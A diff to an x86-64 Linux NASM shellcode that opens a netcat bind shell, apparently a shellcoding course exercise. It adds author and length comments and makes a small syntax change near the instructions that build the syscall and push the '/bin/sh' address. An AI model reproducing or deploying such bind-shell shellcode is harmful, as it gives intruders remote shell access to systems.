@@ -1,4 +1,9 @@
+; { Title: Shellcode linux/x86-64 bind-shell with netcat }
 
+; Author    : Gaussillusion
+; Len       : 131 bytes
+; Language  : Nasm
+; modified by Christophe GOY , SLAE64-1337
 
 
 global _start:
@@ -50,7 +55,7 @@ _start:
         pop r11
 
 	xor r9 , r9
-        mov r9w , word 0x050f   ; opcode for syscall in reverse order
+        mov r9w ,  0x050f   ; opcode for syscall in reverse order
 
 	push	rdx  ;push NULL
 	push 	rcx  ;push address of 'bin/sh'
